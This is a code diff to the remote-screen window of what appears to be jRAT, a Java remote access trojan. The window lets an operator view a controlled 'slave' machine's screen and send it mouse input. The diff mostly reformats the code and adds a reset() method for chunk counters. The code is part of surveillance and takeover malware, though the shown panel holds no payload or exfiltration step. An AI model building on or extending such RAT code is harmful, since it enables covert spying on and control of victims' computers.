@@ -35,6 +35,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.WindowConstants;
 import javax.swing.border.EmptyBorder;
 
+import pro.jrat.RemoteScreenData;
 import pro.jrat.ScreenCommands;
 import pro.jrat.Slave;
 import pro.jrat.packets.incoming.Packet17RemoteScreen;
@@ -43,7 +44,6 @@ import pro.jrat.packets.outgoing.Packet92MousePress;
 import pro.jrat.packets.outgoing.Packet93MouseRelease;
 import pro.jrat.settings.Settings;
 import pro.jrat.threads.ThreadFPS;
-
 
 @SuppressWarnings({ "serial", "rawtypes", "unchecked" })
 public class FrameRemoteScreen extends BaseFrame {
@@ -64,7 +64,7 @@ public class FrameRemoteScreen extends BaseFrame {
 	private JButton btnRecord1;
 	private JButton btnSave_1;
 	private JButton btnStartCapture;
-	public  JProgressBar progressBar;
+	public JProgressBar progressBar;
 	public JComboBox cbDelay;
 	private JToggleButton tglbtnMouse;
 	private JButton btnStop;
@@ -84,14 +84,14 @@ public class FrameRemoteScreen extends BaseFrame {
 			lblFps.setText("FPS: " + fps);
 		}
 	};
-	
+
 	public static final void show(Slave sl) {
 		FrameRemoteScreen frame = new FrameRemoteScreen(sl);
 		frame.setVisible(true);
 		FrameMonitors dialog = new FrameMonitors(frame, sl);
 		dialog.setVisible(true);
 	}
-	
+
 	public boolean mouseInput() {
 		return tglbtnMouse.isSelected();
 	}
@@ -99,29 +99,29 @@ public class FrameRemoteScreen extends BaseFrame {
 	public boolean move() {
 		return tglbtnMove.isSelected();
 	}
-	
+
 	public void setTotalChunks(int v) {
 		lblTotalChunks.setText("Total chunks: " + v);
 	}
-	
+
 	public void setUpdatedChunks(int v) {
 		lblUpdatedChunks.setText("Updated chunks: " + v);
 	}
-	
+
 	public void setLatestChunkSize(int size) {
 		lblLatestChunkSize.setText("Latest chunk size: " + (size / 1024) + " kb");
 	}
-	
+
 	public void clearSize() {
 		imageSize = 0;
 		lblImageSize.setText("Image size: 0 kb");
 	}
-	
+
 	public void increaseSize(int size) {
 		this.imageSize += imageSize;
 		lblImageSize.setText("Image size: " + (this.imageSize / 1024) + " kb");
 	}
-	
+
 	public FrameRemoteScreen(Slave slave) {
 		super();
 		thread.start();
@@ -162,13 +162,13 @@ public class FrameRemoteScreen extends BaseFrame {
 			public void mousePressed(MouseEvent e) {
 				if (mouseInput()) {
 					sl.addToSendQueue(new Packet91MouseMove(e.getX(), e.getY(), monitorindex));
-					
+
 					int button = e.getButton();
 					int xButton = 16;
 					if (button == 3) {
 						xButton = 4;
 					}
-					
+
 					sl.addToSendQueue(new Packet92MousePress(e.getX(), e.getY(), xButton, monitorindex));
 				}
 			}
@@ -181,14 +181,14 @@ public class FrameRemoteScreen extends BaseFrame {
 					if (button == 3) {
 						xButton = 4;
 					}
-					
+
 					sl.addToSendQueue(new Packet93MouseRelease(e.getX(), e.getY(), xButton, monitorindex));
 				}
 			}
 		});
 
 		JToolBar toolBar = new JToolBar();
-		//toolBar.setLayout(new FlowLayout(FlowLayout.CENTER));
+		// toolBar.setLayout(new FlowLayout(FlowLayout.CENTER));
 		toolBar.setRollover(true);
 		toolBar.setFloatable(false);
 
@@ -198,6 +198,7 @@ public class FrameRemoteScreen extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				running = true;
 				clearSize();
+				reset();
 				ScreenCommands.send(sl, getPercentSize(), monitorindex, rows, cols);
 				btnRequestOne.setEnabled(false);
 				btnStartCapture.setEnabled(false);
@@ -214,10 +215,11 @@ public class FrameRemoteScreen extends BaseFrame {
 				btnRequestOne.setEnabled(false);
 				running = true;
 				clearSize();
+				reset();
 				ScreenCommands.sendOnce(sl, getPercentSize(), monitorindex, rows, cols);
 			}
 		});
-		
+
 		btnStop = new JButton("");
 		btnStop.setEnabled(false);
 		btnStop.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/stop.png")));
@@ -249,7 +251,7 @@ public class FrameRemoteScreen extends BaseFrame {
 				}
 			}
 		});
-		
+
 		toolBar.addSeparator(new Dimension(25, 30));
 		btnRecord1.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/record.png")));
 		toolBar.add(btnRecord1);
@@ -278,9 +280,9 @@ public class FrameRemoteScreen extends BaseFrame {
 		});
 		btnSave_1.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/save.png")));
 		toolBar.add(btnSave_1);
-		
+
 		toolBar.addSeparator(new Dimension(25, 30));
-		
+
 		JButton btnKeyboard = new JButton("Keyboard");
 		btnKeyboard.addActionListener(new ActionListener() {
 			@Override
@@ -296,84 +298,68 @@ public class FrameRemoteScreen extends BaseFrame {
 		});
 		btnKeyboard.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/keyboard.png")));
 		toolBar.add(btnKeyboard);
-		
+
 		tglbtnMouse = new JToggleButton("Mouse");
 		tglbtnMouse.setSelected(true);
 		tglbtnMouse.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/mouse.png")));
 		toolBar.add(tglbtnMouse);
-		
+
 		tglbtnMove = new JToggleButton("");
 		tglbtnMove.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/arrow_move_icon.png")));
 		toolBar.add(tglbtnMove);
-		
-		toolBar.addSeparator(new Dimension(10, 30)); 
-		
+
+		toolBar.addSeparator(new Dimension(10, 30));
+
 		JLabel lblDelay = new JLabel("Delay     ");
 		toolBar.add(lblDelay);
-		
+
 		cbDelay = new JComboBox();
-		cbDelay.setModel(new DefaultComboBoxModel(new String[] {"10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}));
+		cbDelay.setModel(new DefaultComboBoxModel(new String[] { "10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0" }));
 		cbDelay.setSelectedIndex(10);
 		toolBar.add(cbDelay);
-		
+
 		toolBar.addSeparator(new Dimension(25, 30));
-		
+
 		JToolBar toolBar_1 = new JToolBar();
 		toolBar_1.setFloatable(false);
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.TRAILING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
-						.addComponent(toolBar_1, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
-						.addComponent(screenPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
-						.addComponent(toolBar, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE))
-					.addGap(4))
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 488, Short.MAX_VALUE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(toolBar_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
-		);
-		
+		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(toolBar_1, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE).addComponent(screenPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE).addComponent(toolBar, GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)).addGap(4)));
+		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(screenPane, GroupLayout.DEFAULT_SIZE, 488, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(toolBar_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)));
+
 		lblTotalChunks = new JLabel("Total chunks: 0");
 		toolBar_1.add(lblTotalChunks);
-		
+
 		toolBar_1.addSeparator(new Dimension(30, 15));
-		
+
 		lblUpdatedChunks = new JLabel("Updated chunks: 0");
 		toolBar_1.add(lblUpdatedChunks);
-		
+
 		toolBar_1.addSeparator(new Dimension(30, 15));
-		
+
 		lblLatestChunkSize = new JLabel("Latest chunk size: 0");
 		toolBar_1.add(lblLatestChunkSize);
-		
+
 		toolBar_1.addSeparator(new Dimension(30, 15));
-		
+
 		lblImageSize = new JLabel("Image size: 0");
 		toolBar_1.add(lblImageSize);
-		
+
 		toolBar_1.addSeparator(new Dimension(30, 15));
-		
+
 		lblFps = new JLabel("FPS: ");
 		toolBar_1.add(lblFps);
-		JCheckBox chckbxProgress = new JCheckBox("Progress    ");		
+		JCheckBox chckbxProgress = new JCheckBox("Progress    ");
 		chckbxProgress.setSelected(true);
 		chckbxProgress.addActionListener(new ActionListener() {
 			@Override
 			public void actionPerformed(ActionEvent arg0) {
-				JCheckBox src = (JCheckBox)arg0.getSource();
+				JCheckBox src = (JCheckBox) arg0.getSource();
 				progressBar.setVisible(src.isSelected());
 			}
 		});
-		
+
 		toolBar.add(chckbxProgress);
-		
+
 		progressBar = new JProgressBar();
 		toolBar.add(progressBar);
 		progressBar.setForeground(Color.LIGHT_GRAY);
@@ -388,7 +374,7 @@ public class FrameRemoteScreen extends BaseFrame {
 				try {
 					Thread.sleep(250L);
 				} catch (Exception ex) {
-					
+
 				}
 			}
 			loader.setVisible(false);
@@ -410,13 +396,25 @@ public class FrameRemoteScreen extends BaseFrame {
 	public double getPercentSize() {
 		return size;
 	}
-	
+
 	public long getDelay() {
 		return Long.parseLong(cbDelay.getSelectedItem().toString()) * 1000L;
 	}
 
 	public ThreadFPS getFPSThread() {
 		return thread;
+	}
+
+	public void reset() {
+		frame.setTotalChunks(0);
+		frame.setUpdatedChunks(0);
+		
+		RemoteScreenData itd = Packet17RemoteScreen.instances.get(slave);
+		
+		if (itd != null) {
+			itd.setChunks(0);
+			itd.setUpdatedChunks(0);
+		}
 	}
 
 }
